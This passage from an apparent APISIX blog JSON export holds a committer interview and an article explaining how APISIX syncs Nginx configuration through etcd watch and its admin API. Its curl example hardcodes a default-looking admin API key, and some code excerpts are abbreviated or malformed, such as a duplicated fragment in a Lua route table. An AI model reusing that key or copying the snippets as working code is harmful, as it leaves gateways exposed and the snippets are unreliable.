channel](https://slack.cncf.io/) (#project-chaos-mesh) or submit your pull requests or issues to its [GitHub repository](https://github.com/chaos-mesh/chaos-mesh)."},{"id":"2021/08/11/interview-tuzhengsong","metadata":{"permalink":"/blog/2021/08/11/interview-tuzhengsong","source":"@site/blog/2021/08/11/interview-TuZhengsong.md","title":"My first PR in the Apache APISIX community","description":"This article introduces Apache APISIX Zhengsong Tu\'s growth experience as a committer, and why he should participate in the Apache APISIX community and his contributions to the community.","date":"2021-08-11T00:00:00.000Z","formattedDate":"August 11, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":9.915,"truncated":true,"authors":[{"name":"Apache APISIX","url":"https://github.com/Yangxiamao","imageURL":"https://avatars.githubusercontent.com/u/47442074?v=4"}],"prevItem":{"title":"Chaos Mesh Helps Apache APISIX Improve System Stability","permalink":"/blog/2021/08/12/chaos-mesh-helps-apache-apisix-improve-system-stability"},"nextItem":{"title":"APISIX Architecture: How to Dynamically Manage NGINX Cluster?","permalink":"/blog/2021/08/10/apisix-nginx"}},"content":"> This interview is about Zhengsong Tu\'s journey from an open source community nerd to an APISIX committer for Apache\'s top open source project. Zhengsong Tu (GitHub ID: tzssangglass) was elected as an Apache APISIX committer on July 22, 2021 for his deep involvement in Apache APISIX development and his many contributions to the community.\\n\\n\x3c!--truncate--\x3e\\n\\n> When I saw that issue, I had a strong urge to get involved in the community. After reading the community\'s newbie guide, I was like a brave man coming out of the newbie village, ready to fight.\\n>\\n> -- Zhengsong Tu, Apache APISIX committer\\n\\nIn 282 days, Zhengsong Tu (GitHub ID: tzssangglass) has grown from an open source community nerd to an Apache APISIX committer.\\n\\n![Apache APISIX committer tzssangglass github](https://static.apiseven.com/202108/1639549454040-de5d7598-83b7-483f-a5da-55fedeb5fa90.png)\\n\\nZhengsong Tu was elected as Apache APISIX committer on July 22, 2021 for his deep involvement in Apache APISIX development and many contributions in the community.\\n\\nOn an uneventful afternoon, we chatted with Zhengsong by phone. Because of the epidemic, he has not been out for many days in Nanjing. Before I talked to him, I didn\'t expect that the bearded man had traveled such a winding road.\\n\\n## University, my university\\n\\n> When I was in college, I studied communication engineering, and the happiest thing I did every day was to play soccer. Now sometimes I think that it would be nice to go back to my college days with the memories I have now.\\n\\nZhengsong actually didn\'t have much contact with programming during his college years, he actually had a C programming class, but he failed it because he was too busy playing soccer. However, he failed a make-up exam after failing the class, resulting in a retake. The most embarrassing thing is that he failed the retake as well, so what did he do afterwards? There was a graduation clearing exam before graduation. This can not be failed again, so Zhengsong went to the library to borrow a C language book to read.\\n\\n\\"I was thinking, \\"Is C really that hard?\\" Zhengsong said.\\n\\nThen he kept reading and reading and reading, and suddenly he realized that programming seemed to have some meaning, and he understood it! He finally passed the exam before graduating. After graduation, he found a job as a programmer.\\n\\n\\"I was ready to graduate and go home and find a factory to work.\\" , he said half-jokingly.\\n\\nAt that time, he probably wouldn\'t have thought that today he would be the developer of several well-known open source projects, and involved in the development of some infrastructure that supports millions of concurrent traffic.\\n\\n## Out of the Ivory Tower\\n\\n> In industry, the real business scenario is very different from what you learn in school.\\n\\nZhengsong\'s first job was at a wearable device startup, working on the development of smart bracelets. Zhengsong and his former colleagues had to process various sensor data from the smart bracelet to monitor the user\'s heart rate, exercise, blood pressure and so on.\\n\\n\\"It was fun because in industry, the real business scenario is very different from what you learn in school, and a lot of things have to be learned from scratch,\\" Zhengsong said.\\n\\nOne day after work, the owner of this company suddenly sent a message saying that the company\'s employees were on temporary leave and that they would wait to be notified when to work.\\n\\nZhengsong felt something was wrong at that time, how to work well, suddenly on vacation? Then he immediately opened the recruitment software and started looking for a new job. Later, he found out that the owner of the company had a contract dispute with the supplier, and the company was briefly shut down.\\n\\nThen, Zhengsong went to another company to engage in back-end business development work, to learn the industry norms and further improve technology. After almost a year, he joined the development team of a large company to work on middleware-related development because he liked the simplicity and high performance of technologies like Nginx, OpenResty, and Netty.\\n\\n\\"In this big company, I did a little bit far from the business, more technically oriented. \\"Zhengsong said.\\n\\nZhengsong\'s contact with Apache APISIX was in September 2020, when his team was using Kong, but Kong was not fully meeting their needs, so they redid the technical selection of the gateway to try to find a better solution. Zhengsong was in charge of this technical selection, so he came across the Apache Foundation\'s top project, Apache APISIX, and was introduced to the Apache APISIX community.\\n\\nAt that time, he had already graduated more than three years ago.\\n\\n## Out of the newbie village\\n\\n> I can submit code to the Apache Foundation\'s top projects! As a technical worker, that\'s a lot of technical confidence.\\n\\nZhengsong\'s first PR in the open source community was an enhancement type PR, which enabled Apache APISIX to support multi-port listening.\\n\\n- issue: https://github.com/apache/apisix/issues/1195\\n- PR: https://github.com/apache/apisix/pull/2409\\n\\nThis feature is needed by Zhengsong and has been mentioned in the issue area for a long time, but for some reason it has been unclaimed. Before that, Zhengsong happened to know something about this, so he thought, \\"I can propose a PR to Apache APISIX to fix this problem. \\"So he volunteered to have the issue assigned to him in the issue.\\n\\nHe says, \\"I had a strong urge to get involved in the community, and then I looked at the Apache APISIX community\'s Beginner\'s Guide and was as excited to get involved as if I were coming out of the Beginner\'s Village with a weapon.\\"\\n\\nAfter choosing this issue, Zhengsong started discussing details with his community partners on GitHub, such as the style of the configuration port, the idea of the implementation, and so on. After the discussion, he started to implement it. Every night after work, he went through the Apache APISIX code and tested the use cases. After three or four nights of struggling, the test ran for the first time!\\n\\nZhengsong was very excited and immediately followed the guide to bring up the PR. Then he accepted the comments from Code Review and further modified the code. Finally, on October 18, the PR was successfully merged into the repository.\\n\\n![Apache APISIX committer tzssangglass pr](https://static.apiseven.com/202108/1639549390155-6b6cb167-8c9a-43fb-8859-f58cd6b1aae7.png)\\n\\n\\"I was very excited and felt like I was finally substantially involved in the open source community. I could submit code to the Apache Foundation\'s top projects! As a technical worker, it was a technical confidence.\\"\\n\\n**This is Zhengsong\'s first PR in the open source world.**\\n\\n## Things that impressed me in the community\\n\\n> Because etcd has a MaxCallRecvMsgSize limit, it was most elegant and appropriate to go to the source of etcd.\\n\\nWhen we asked what was the thing that impressed Zhengsong most in the community, Zhengsong thought about it and said it was probably a bug-related issue: etcd\'s MaxCallRecvMsgSize limitation.\\n\\nZhengsong had been tormented by etcd\'s return size limitation problem, and the community had reflected and discussed this problem many times, but it was not very elegant on Apache APISIX no matter how it was handled.\\n\\nIn April this year, one of our partners submitted a PR to etcd, which finally solved the problem. When Zhengsong heard about this, he was very shocked, he didn\'t think it would be solved in such a way. But in hindsight, this was the way to go.\\n\\n\\"Because etcd has a MaxCallRecvMsgSize limit, it\'s most elegant and appropriate to go to the source of etcd. This is great example of cross-community collaboration,\\" says Zhengsong.\\n\\n## Sir, this way\\n\\n> We\'re all working together differently, but we\'re all contributing to open source.\\n\\nZhengsong says that when he first started participating in the community, he went through most of the APISIX documentation he could see at the time. So when he was working in his company, his colleagues asked him questions, and although he was not very clear, he knew the distribution of the project\'s documentation, so he could look it up directly and know roughly what the problem was. He believes that reading the documentation is an appropriate way to get familiar with the project.\\n\\nThe Apache APISIX project website has a good guide for newcomers, including how to raise PR. If you want to participate in the community, you can first read the main documentation on the website and Github to get a basic understanding of the project and the distribution of the project\'s documentation, and then index the documentation as needed.\\n\\nIf you want to contribute to the code, or participate in the design, some knowledge of Nginx or OpenResty is necessary. This includes looking at their official documentation and code, and learning about their implementation of relevant features.\\n\\nZhengsong said, \\"I think this step is impossible to skip.\\"\\n\\nOf course, you can get involved in the community as a user. For example, if you think there is something wrong with the documentation, or if you follow the documentation and find that it is not the case, you can also raise some issues to point out these problems.\\n\\nWe are all working together, but we are all contributing to open source.\\n\\n## Everyone is welcome in the community\\n\\n> But it\'s better this way\\n\\nZhengsong said, we are all in the open source community, the first thing to pay attention to is to comply with some of the community rules, and the community of partners to communicate on an equal footing.\\n\\nThe points to note when communicating can be divided into two kinds.\\n\\nThe first is that if you encounter some problems, then you should try to accurately describe the problem and provide reproducible use cases. This is actually the most popular, or one of the most effective ways to improve communication. If you can describe a problem very clearly, then people will naturally answer the question very high efficiency.\\n\\nThe second is that if you are proposing ideas, solving problems, etc., before you do it, for points of ambiguity, you need to discuss them in a public forum, such as issue, mailing lists, etc., to reach agreement in the community, and then start doing it after you have achieved consensus.\\n\\n## About Apache Way\\n\\n> Consensus will also be updated, and it is a force for the community to move the project forward.\\n\\nThe Apache Way, as Zhengsong understands it, is about community over code.\\n\\nHe believes that the community is essentially a collaboration between people, where everyone divides up the work and does their own job. But before we cooperate and do our own work, we need to form some consensus.\\n\\nConsensus is built up little by little. The community participants throw out a problem, and the community will discuss, argue, verify, and finally solve these problems. In this process, consensus is slowly formed in the community, and it may be a norm, a boundary, or some other form of consensus. Consensus is also updated, and it is a force for the community to move the project forward. This process has some idealistic overtones.\\n\\nCommunity consensus is actually more important than you making code contributions, because with consensus, when you go back to a point of change later, it will be clearer to know the origin of the change and the perspective at that time.\\n\\n## Finally\\n\\nFinally, before we shut down the mike, we asked Zhengsong to recommend something to us. After thinking about it, Zhengsong said, \\"I recommend a German film related to social engineering, Who Am I: No Absolutely Safe System, and a book by Fei-Li Kong, Calling the Spirits: The Great Chinese Demon Panic of 1768. I hope you will not forget to enrich your spiritual life even in the midst of your busy work. \\"\\n\\nThat\'s it for this interview! Which community member will we interview next time? Check out the Apache APISIX community and find out! Maybe you\'ll be the next committer!"},{"id":"APISIX Architecture: How to Dynamically Manage NGINX Cluster?","metadata":{"permalink":"/blog/2021/08/10/apisix-nginx","source":"@site/blog/2021/08/10/apisix-nginx.md","title":"APISIX Architecture: How to Dynamically Manage NGINX Cluster?","description":"This article mainly introduces the principle of APISIX to implement REST API remote control of Nginx cluster based on APISIX 2.8, OpenResty 1.19.3.2 and Nginx 1.19.3.","date":"2021-08-10T00:00:00.000Z","formattedDate":"August 10, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":16.66,"truncated":true,"authors":[{"name":"Hui Tao"}],"prevItem":{"title":"My first PR in the Apache APISIX community","permalink":"/blog/2021/08/11/interview-tuzhengsong"},"nextItem":{"title":"Hyperchain Technology implements BaaS platform with APISIX","permalink":"/blog/2021/08/09/apache-apisix-in-quliankeji"}},"content":"> This article is re-posted from Tao Hui\'s personal blog, and introduces the principles of Apache APISIX for REST API remote control of Nginx clusters based on APISIX version 2.8, OpenResty version 1.19.3.2, and Nginx version 1.19.3.\\n\\n\x3c!--truncate--\x3e\\n\\nOne of the most criticized aspects of the open source version of Nginx is that it does not have dynamic configuration, remote API, and cluster management capabilities. Apache APISIX, the open source seven-tier gateway graduated from the Apache Foundation, implements dynamic management of Nginx clusters based on etcd and Lua.\\n\\n![APISIX architecture diagram](https://static.apiseven.com/202108/1631170283612-ba5e27ff-726b-47a6-aa51-84731b067c44.png)\\n\\nMaking Nginx dynamically, cluster-managed is not easy, as it would face the following problems.\\n\\n* The microservices architecture makes for a large variety and number of upstream services, which leads to extremely frequent changes to routing rules, and upstream Servers. Nginx\'s route matching is based on static Trie prefix trees, hash tables, and regular arrays, so once `server_name` and `location` change, it is impossible to dynamically change the configuration without performing a reload.\\n* Nginx positions itself as an ADC edge load balancer, so it does not support the HTTP2 protocol upstream. This makes it more difficult for the OpenResty ecosystem to implement the etcd gRPC interface, so receiving configuration changes through the watch mechanism is inefficient\\n* Multi-process architecture makes it harder to synchronize data between worker processes, so you must choose a low-cost implementation mechanism to ensure that each Nginx node and worker process has the latest configuration\\n\\nApache APISIX is based on the Lua timer and the lua-resty-etcd module for dynamic configuration management. The principle of Nginx clustering.\\n\\n## Configuration synchronization scheme based on etcd watch mechanism\\n\\nManaging a cluster must rely on a centralized configuration, and etcd is one such database. etcd was chosen as the configuration center for Apache APISIX because it has two advantages.\\n\\n* etcd uses the Paxos-like Raft protocol to guarantee data consistency, and it is a decentralized, distributed database that is more reliable than relational databases\\n* etcd\'s watch mechanism allows clients to monitor changes to a key, i.e., if the value of a key like /nginx/http/upstream changes, the watch client will be notified immediately, as shown in the following figure.\\n![etcd-based synchronization of nginx configuration](https://static.apiseven.com/202108/1631170345853-f020a64d-3e97-49c0-8395-c9e4e9cf4233.jpeg)\\n\\nTherefore, unlike Orange and Kong, Apache APISIX uses etcd as the centralized configuration component. You can see a similar configuration in a production environment of Apache APISIX via etcdctl as follows.\\n\\n```yaml\\n# etcdctl get \\"/apisix/upstreams/1\\"\\n/apisix/upstreams/1\\n{\\"hash_on\\": \\"vars\\", \\"nodes\\":{\\"httpbin.org:80\\":1}, \\"create_time\\":1627982128, \\"update_time\\":1627982128, \\"scheme\\": \\"http\\", \\"type\\":\\" roundrobin\\", \\"pass_host\\": \\"pass\\", \\"id\\": \\"1\\"}\\n```\\n\\nWhere the prefix /apisix can be changed in conf/config.yaml, e.g.\\n\\n```yaml\\netcd:\\n  host:\\n    - \\"http://127.0.0.1:2379\\"\\n  prefix: /apisix # apisix configurations prefix\\n```\\n\\nand upstreams/1 is equivalent to http { upstream 1 {} } in nginx.conf. Similar keywords are used in /apisix/services/, /apisix/routes/, and so on.\\n\\nSo, how does Nginx get the etcd configuration data changes through the watch mechanism? Does it start a new agent process? Does it communicate with etcd via HTTP/1.1 or gRPC?\\n\\n## ngx.timer.at timer\\n\\nApache APISIX does not start a process other than Nginx to communicate with etcd. It actually implements the watch mechanism through the `ngx.timer.at` timer. For those who are not familiar with OpenResty, let\'s take a look at how the timer is implemented in Nginx, which is the basis for the watch mechanism.\\n\\n### Nginx\'s red-black tree timer\\n\\nNginx uses an epoll + nonblock socket multiplexing mechanism to implement an event handling model in which each worker process cycles through network IO and timer events.\\n\\n```c\\n//see the src/os/unix/ngx_process_cycle.c file for Nginx\\nstatic void\\nngx_worker_process_cycle(ngx_cycle_t *cycle, void *data)\\n{\\n    for (;; ) {\\n        ngx_process_events_and_timers(cycle);\\n    }\\n}\\n\\n// See the ngx_proc.c file\\nvoid\\nngx_process_events_and_timers(ngx_cycle_t *cycle)\\n{\\n    timer = ngx_event_find_timer();\\n    (void) ngx_process_events(cycle, timer, flags);\\n    ngx_event_process_posted(cycle, &ngx_posted_accept_events);\\n    ngx_event_expire_timers();\\n    ngx_event_process_posted(cycle, &ngx_posted_events);\\n}\\n```\\n\\nThe `ngx_event_expire_timers` function calls the handler method of all timeout events. In fact, the timer is implemented by a [red-black tree](https://zh.wikipedia.org/zh-hans/%E7%BA%A2%E9%BB%91%E6%A0%91) (a balanced ordered binary tree), where the key is the absolute expiration time of each event. This way, expired events can be found quickly by comparing the minimum node with the current time.\\n\\n### Lua timer for OpenResty\\n\\nOf course, the above C functions are very inefficient to develop. Therefore, OpenResty wraps the Lua interface and exposes the C function `ngx_timer_add` to the Lua language via [ngx.timer.at](https://github.com/openresty/lua-nginx-module#ngxtimerat).\\n\\n```c\\n//see OpenResty /ngx_lua-0.10.19/src/ngx_http_lua_timer.c file\\nvoid\\nngx_http_lua_inject_timer_api(lua_State *L)\\n{\\n    lua_createtable(L, 0 /* narr */, 4 /* nrec */); /* ngx.timer. */\\n\\n    lua_pushcfunction(L, ngx_http_lua_ngx_timer_at);\\n    lua_setfield(L, -2, \\"at\\");\\n\\n    lua_setfield(L, -2, \\"timer\\");\\n}\\nstatic int\\nngx_http_lua_ngx_timer_at(lua_State *L)\\n{\\n    return ngx_http_lua_ngx_timer_helper(L, 0);\\n}\\nstatic int\\nngx_http_lua_ngx_timer_helper(lua_State *L, int every)\\n{\\n    ngx_event_t *ev = NULL;\\n    ev->handler = ngx_http_lua_timer_handler;\\n    ngx_add_timer(ev, delay);\\n}\\n```\\n\\nSo when we call `ngx.timer.at` Lua timer, we are adding the `ngx_http_lua_timer_handler` callback function to Nginx\'s red-black tree timer, which does not block Nginx.\\n\\nLet\'s see how Apache APISIX uses `ngx.timer.at`.\\n\\n### Apache APISIX timer-based watch mechanism\\n\\nThe Nginx framework provides a number of hooks for C module development, and OpenResty exposes some of them as Lua, as shown in the following image.\\n\\n![openresty hooks](https://static.apiseven.com/202108/1631170424663-53f56c99-aefc-4546-ac0b-76a25a6f0071.png)\\n\\nApache APISIX uses only eight of these hooks (note that APISIX does not use `set_by_lua` and `rewrite_by_lua`; the rewrite phase of the plugin is actually self-defined by Apache APISIX and is not related to Nginx), including\\n\\n* init_by_lua: initialization of the Master process when it starts\\n* init_worker_by_lua: initialization of each worker process at startup (including initialization of privileged agent processes, which are key to implementing remote RPC calls from multilingual plugins such as Java)\\n* ssl_certificate_by_lua: openssl provides a hook when handling the TLS handshake, which OpenResty exposes as Lua by modifying the Nginx source code\\n* access_by_lua: After receiving the downstream HTTP request header, it matches the routing rules such as Host domain, URI, Method, etc., and selects the Service, plugins in Upstream and upstream Server.\\n* balancer_by_lua: All reverse proxy modules executed in the content phase call back the `init_upstream` hook function, named `balancer_by_lua` by OpenResty, when the upstream Server is selected.\\n* header_filter_by_lua: hook to be executed before sending HTTP response headers downstream\\n* body_filter_by_lua: hook to be executed before sending the HTTP response packet body downstream\\n* log_by_lua: hook for logging access logs\\n\\nOnce we have the above knowledge ready, we can answer how Apache APISIX receives updates to etcd data.\\n\\n#### How nginx.conf is generated\\n\\nEach Nginx worker process starts a timer in the ``init_worker_by_lua`` phase with the ``http_init_worker`` function.\\n\\n```lua\\ninit_worker_by_lua_block {\\n    apisix.http_init_worker()\\n}\\n```\\n\\nYou may be curious to know that you don\'t see nginx.conf after downloading the Apache APISIX source code, where did this configuration come from?\\n\\nThe nginx.conf here is actually generated in real time by the Apache APISIX startup command. When you execute make run, it generates nginx.conf based on the Lua template apisix/cli/ngx_tpl.lua file. Note that the template rules here are self-implemented by OpenResty; see [lua-resty-template](https://github.com) for syntax details. /bungle/lua-resty-template). See the apisix/cli/ops.lua file for the specific code that generates nginx.conf.\\n\\n```lua\\nlocal template = require(\\"resty.template\\")\\nlocal ngx_tpl = require(\\"apisix.cli.ngx_tpl\\")\\nlocal function init(env)\\n    local yaml_conf, err = file.read_yaml_conf(env.apisix_home)\\n    local conf_render = template.compile(ngx_tpl)\\n    local ngxconf = conf_render(sys_conf)\\n\\n    local ok, err = util.write_file(env.apisix_home .. \\"/conf/nginx.conf\\",\\n                                    ngxconf)\\n```\\n\\nOf course, Apache APISIX allows you to modify some of the data in the nginx.conf template by modifying the conf/config.yaml configuration in a way that mimics the syntax of conf/config-default.yaml. See the `read_yaml_conf` function for an example of how to do this.\\n\\n```lua\\nfunction _M.read_yaml_conf(apisix_home)\\n    local local_conf_path = profile:yaml_path(\\"config-default\\")\\n    local default_conf_yaml, err = util.read_file(local_conf_path)\\n\\n    local_conf_path = profile:yaml_path(\\"config\\")\\n    local user_conf_yaml, err = util.read_file(local_conf_path)\\n    ok, err = merge_conf(default_conf, user_conf)\\nend\\n```\\n\\nAs you can see, only some of the data in the ngx_tpl.lua template can be replaced by the yaml configuration, where conf/config-default.yaml is the official default configuration, and conf/config.yaml is a custom configuration overridden by the user. If you feel that replacing the template data is not enough, you can modify the ngx_tpl template directly.\\n\\n#### How Apache APISIX gets etcd notifications\\n\\nApache APISIX stores the configurations to be monitored in etcd with different prefixes, which currently include the following 11 types.\\n\\n* /apisix/consumers/: Apache APISIX supports the consumer abstraction upstream category\\n* /apisix/global_rules/: global generic rules\\n* /apisix/plugin_configs/: Plugin that can be reused across Router\\n* /apisix/plugin_metadata/: metadata of some plugins\\n* /apisix/plugins/: list of all Plugin plugins\\n* /apisix/proto/: When passing the gRPC protocol, some plugins need to convert the protocol content, this configuration stores the protobuf message definition\\n* /apisix/routes/: Routing information, which is the entry point for HTTP request matching, you can specify the upstream Server directly, or mount services or upstream\\n* /apisix/services/: you can abstract the common parts of similar router as services and mount the plugin\\n* /apisix/ssl/: SSL certificate public and private keys and related matching rules\\n* /apisix/stream_routes/: route matching rules for OSI Layer 4 gateways\\n* /apisix/upstreams/: abstraction of a set of upstream Server hosts\\n\\nEach type of configuration here has a different processing logic, so Apache APISIX abstracts the apisix/core/config_etcd.lua file to focus on the update maintenance of each type of configuration on etcd. Each type of configuration in the `http_init_worker` function generates 1 config_etcd object.\\n\\n```lua\\nfunction _M.init_worker()\\n    local err\\n    plugin_configs, err = core.config.new(\\"/plugin_configs\\", {\\n        automatic = true,\\n        item_schema = core.schema.plugin_config,\\n        checker = plugin_checker,\\n    })\\nend\\n```\\n\\nAnd in the new function of `config_etcd`, the `_automatic_fetch` timer will be registered recursively:\\n\\n```lua\\nfunction _M.new(key, opts)\\n    ngx_timer_at(0, _automatic_fetch, obj)\\nend\\n```\\n\\nThe `_automatic_fetch` function iterates the `sync_data` function (wrapped under xpcall to catch exceptions).\\n\\n```lua\\nlocal function _automatic_fetch(premature, self)\\n    local ok, err = xpcall(function()\\n        local ok, err = sync_data(self)\\n    end, debug.traceback)\\n    ngx_timer_at(0, _automatic_fetch, self)\\nend\\n```\\n\\nThe `sync_data` function will get updates through etcd\'s watch mechanism, which we will analyze in detail next.\\n\\nSo to summarize, Apache APISIX inserts `_automatic_fetch` into the timer via the `ngx.timer.at` function during the startup of each Nginx worker process. The `_automatic_fetch` function receives notifications of configuration changes in etcd through the `sync_data` function, based on a watch mechanism, so that each Nginx node and worker process will be kept up to date with the latest configuration. This design also has one obvious advantage: the configuration in etcd is written directly to the Nginx worker process, so that the new configuration can be used directly when processing requests, without having to synchronize the configuration between processes, which is easier than starting an agent process!\\n\\n### HTTP/1.1 protocol for the lua-resty-etcd library\\n\\nHow exactly does the `sync_data` function get the configuration change messages from etcd? Let\'s look at the `sync_data` source code.\\n\\n```lua\\nlocal etcd = require(\\"resty.etcd\\")\\netcd_cli, err = etcd.new(etcd_conf)\\n\\nlocal function sync_data(self)\\n    local dir_res, err = waitdir(self.etcd_cli, self.key, self.prev_index + 1, self.timeout)\\nend\\n\\nlocal function waitdir(etcd_cli, key, modified_index, timeout)\\n    local res_func, func_err, http_cli = etcd_cli:watchdir(key, opts)\\n    if http_cli then\\n        local res_cancel, err_cancel = etcd_cli:watchcancel(http_cli)\\n    end\\nend\\n```\\n\\nThe actual communication with etcd here is the [lua-resty-etcd](https://github.com/api7/lua-resty-etcd) library. It provides the watchdir function to receive notifications from etcd when it finds a change in the value of the key directory.\\n\\nAnd what does the watchcancel function do? This is actually the result of a deficiency in the OpenResty ecosystem. etcd v3 already supports the efficient gRPC protocol (the underlying HTTP2 protocol). As you may have heard, HTTP2 not only has the ability to multiplex, but also supports direct server pushing of messages from the HTTP3 protocol against HTTP2: !\\n\\n![http2_stream_frame_conn](https://static.apiseven.com/202108/1631170499370-57a7c452-e97e-4ac0-b7bf-073e13946a21.png)\\n\\nHowever, Lua Eco does not currently support the HTTP2 protocol, so the lua-resty-etcd library actually communicates with etcd via the inefficient HTTP/1.1 protocol, and therefore receives /watch notifications via /v3/watch requests with timeouts. This phenomenon is actually caused by two things.\\n\\n1. Nginx positions itself as an edge load balancer, so the upstream must be the corporate intranet, which has low latency and high bandwidth, so it does not need to support the HTTP2 protocol for the upstream protocol\\nThe HTTP2 protocol is very complex, and there is no HTTP2 cosocket library available for production environments.\\n\\nThe lua-resty-etcd library using HTTP/1.1 is actually very inefficient, and if you capture packets on APISIX, you will see frequent POST messages with a URI of /v3/watch and a Base64-encoded watch directory with a body of\\n\\n![APISIX communicates with etcd over HTTP1](https://static.apiseven.com/202108/1631170602368-d105d014-efe4-48c7-93b8-be5447c76a70.jpeg)\\n\\nWe can verify the implementation details of the `watchdir` function.\\n\\n```lua\\n-- lib/resty/etcd/v3.lua \u6587\u4ef6\\nfunction _M.watchdir(self, key, opts)\\n    return watch(self, key, attr)\\nend\\n\\nlocal function watch(self, key, attr)\\n    callback_fun, err, http_cli = request_chunk(self, \'POST\', \'/watch\',\\n                                                opts, attr.timeout or self.timeout)\\n    return callback_fun\\nend\\n\\nlocal function request_chunk(self, method, path, opts, timeout)\\n    http_cli, err = utils.http.new()\\n    -- \u53d1\u8d77 TCP \u8fde\u63a5\\n    endpoint, err = http_request_chunk(self, http_cli)\\n    -- \u53d1\u9001 HTTP \u8bf7\u6c42\\n    res, err = http_cli:request({\\n        method  = method,\\n        path    = endpoint.api_prefix .. path,\\n        body    = body,\\n        query   = query,\\n        headers = headers,\\n    })\\nend\\n\\nlocal function http_request_chunk(self, http_cli)\\n    local endpoint, err = choose_endpoint(self)\\n    ok, err = http_cli:connect({\\n        scheme = endpoint.scheme,\\n        host = endpoint.host,\\n        port = endpoint.port,\\n        ssl_verify = self.ssl_verify,\\n        ssl_cert_path = self.ssl_cert_path,\\n        ssl_key_path = self.ssl_key_path,\\n    })\\n\\n    return endpoint, err\\nend\\n```\\n\\nAs you can see, Apache APISIX makes sure that each worker process contains the latest configuration by **repeatedly requesting etcd through the `ngx.timer.at` and lua-resty-etcd libraries in each worker process.**\\n\\n## APISIX configuration and plugin remote changes\\n\\nNext, let\'s look at how to remotely modify the configuration in etcd.\\n\\nWe can of course modify the contents of the corresponding key in etcd directly through the gRPC interface, and then make the Nginx cluster automatically update its configuration based on the watch mechanism described above. However, this is risky because the configuration request is not verified, and the configuration data does not match the Nginx cluster.\\n\\n### Modifying configuration via Nginx\'s /apisix/admin/ interface\\n\\nApache APISIX provides a mechanism to access any one Nginx node, verify the request with Lua code in its worker process, and then write it to etcd through the /v3/dv/put interface. Let\'s take a look at how Apache APISIX does this.\\n\\nFirst, the nginx.conf generated by make run automatically listens on port 9080 (as modified by the apisix.node_listen configuration in config.yaml), and when ``apisix.enable_admin`` is set to true, nginx.conf will generate the following configuration.\\n\\n```yaml\\nserver {\\n    listen 9080 default_server reuseport;\\n\\n    location/apisix/admin {\\n        content_by_lua_block {\\n            apisix.http_admin()\\n        }\\n    }\\n}\\n\\n```\\n\\nThus, the /apisix/admin requests received by Nginx will be processed by the `http_admin` function.\\n\\n```lua\\n-- /apisix/init.lua file\\nfunction _M.http_admin()\\n    local ok = router:dispatch(get_var(\\"uri\\"), {method = get_method()})\\nend\\n```\\n\\nSee the [GitHub](https://github.com/apache/apisix/blob/release/2.8/docs/zh/latest/admin-api.md) documentation for APIs that the admin interface can handle, where when the method method differs from the URI, the dispatch performs different handler functions based on the following.\\n\\n```lua\\n-- /apisix/admin/init.lua file\\nlocal uri_route = {\\n    {\\n        paths = [[/apisix/admin/*]],\\n        methods = { \\"GET\\", \\"PUT\\", \\"POST\\", \\"DELETE\\", \\"PATCH\\"},\\n        handler = run,\\n    },\\n    {\\n        paths = [[/apisix/admin/stream_routes/*]],\\n        methods = {\\"GET\\", \\"PUT\\", \\"POST\\", \\"DELETE\\", \\"PATCH\\"}, { paths = [[/apisix/admin/stream_routes/*]], { methods = {\\"GET\\", \\"PUT\\", \\"POST\\", \\"DELETE\\", \\"PATCH\\"},\\n        handler = run_stream,\\n    },\\n    {\\n        paths = [[/apisix/admin/plugins/list]],\\n        methods = {\\"GET\\"},\\n        handler = get_plugins_list,\\n    },\\n    {\\n        paths = reload_event,\\n        methods = {\\"PUT\\"},\\n        handler = post_reload_plugins,\\n    },\\n}\\n```\\n\\nFor example, when creating 1 Upstream via /apisix/admin/upstreams/1 and the PUT method.\\n\\n```shell\\ncurl \\"http://127.0.0.1:9080/apisix/admin/upstreams/1\\" -H \\"X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\\" -X PUT -d \'\\n> {\\n>   \\"type\\": \\"roundrobin\\",\\n>   \\"nodes\\": {\\n>     \\"httpbin.org:80\\": 1\\n>   }\\n> }\\n{\\"action\\":\\"set\\",\\"node\\":{\\"key\\":\\"\\\\/apisix\\\\/upstreams\\\\/1\\",\\"value\\":{\\"hash_on\\":\\"vars\\",\\"nodes\\":{\\"httpbin.org:80\\":1},\\"create_time\\":1627982128,\\"update_time\\":1627982128,\\"scheme\\":\\"http\\",\\"type\\":\\"roundrobin\\",\\"pass_host\\":\\"pass\\",\\"id\\":\\"1\\"}}}\'\\n```\\n\\nYou will see the following log in error.log (to see this line, you must set the nginx_config.error_log_level in config.yaml to INFO)\\n\\n```yaml\\n2021/08/03 17:15:28 [info] 16437#16437: *23572 [lua] init.lua:130: handler(): uri: [\\"\\",\\"apisix\\",\\"admin\\",\\"upstreams\\",\\"1\\"], client: 127.0.0.1, server: _, request: \\"PUT /apisix/admin/upstreams/1 HTTP/1.1\\", host: \\"127.0.0.1:9080\\"\\n```\\n\\nThis line is actually printed by the `run` function in /apisix/admin/init.lua, which is executed based on the uri_route dictionary above. Let\'s look at the contents of the run function.\\n\\n```lua\\n-- /apisix/admin/init.lua\u6587\u4ef6\\nlocal function run()\\n    local uri_segs = core.utils.split_uri(ngx.var.uri)\\n    core.log.info(\\"uri: \\", core.json.delay_encode(uri_segs))\\n\\n    local seg_res, seg_id = uri_segs[4], uri_segs[5]\\n    local seg_sub_path = core.table.concat(uri_segs, \\"/\\", 6)\\n\\n    local resource = resources[seg_res]\\n    local code, data = resource[method](seg_id, req_body, seg_sub_path,\\n                                        uri_args)\\nend\\n```\\n\\n\u8fd9\u91cc `resource[method]` \u51fd\u6570\u53c8\u88ab\u505a\u4e86 1 \u6b21\u62bd\u8c61\uff0c\u5b83\u662f\u7531 resources \u5b57\u5178\u51b3\u5b9a\u7684\uff1a\\n\\n```lua\\n-- /apisix/admin/init.lua\u6587\u4ef6\\nlocal resources = {\\n    routes          = require(\\"apisix.admin.routes\\"),\\n    services        = require(\\"apisix.admin.services\\"),\\n    upstreams       = require(\\"apisix.admin.upstreams\\"),\\n    consumers       = require(\\"apisix.admin.consumers\\"),\\n    schema          = require(\\"apisix.admin.schema\\"),\\n    ssl             = require(\\"apisix.admin.ssl\\"),\\n    plugins         = require(\\"apisix.admin.plugins\\"),\\n    proto           = require(\\"apisix.admin.proto\\"),\\n    global_rules    = require(\\"apisix.admin.global_rules\\"),\\n    stream_routes   = require(\\"apisix.admin.stream_routes\\"),\\n    plugin_metadata = require(\\"apisix.admin.plugin_metadata\\"),\\n    plugin_configs  = 